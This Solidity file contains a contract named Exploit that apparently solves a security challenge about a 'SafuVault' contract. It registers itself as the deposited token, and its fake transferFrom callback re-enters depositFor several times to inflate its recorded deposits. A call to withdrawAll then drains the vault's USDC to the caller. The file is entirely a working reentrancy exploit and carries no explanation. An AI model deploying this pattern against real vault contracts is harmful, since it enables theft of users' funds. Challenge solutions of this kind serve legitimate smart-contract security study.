// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISafuVault {
    function depositFor(address token, uint256 _amount,  address user) external;
    function withdrawAll() external;
}

contract Exploit {
    uint8 internal reenterNum;
    ISafuVault internal safuvault;
    IERC20 internal usdc;
    constructor(address safuVaultAddress, address usdcAddress) {
        safuvault = ISafuVault(safuVaultAddress);
        usdc = IERC20(usdcAddress);
    }

    function start() public {
        usdc.approve(address(safuvault) ,10000e18);
        safuvault.depositFor(address(this), 10000e18, address(this));
        safuvault.withdrawAll();
        usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
    }

    function transferFrom(address from, address to, uint256 tokenId) public {
        require(msg.sender == address(safuvault), "WHO?");
    
        if (reenterNum <= 5) {
            reenterNum = ++reenterNum;
            safuvault.depositFor(address(this), 10000e18, address(this));
        } else {
            safuvault.depositFor(address(usdc), 10000e18, address(this));
        }     
    }
}
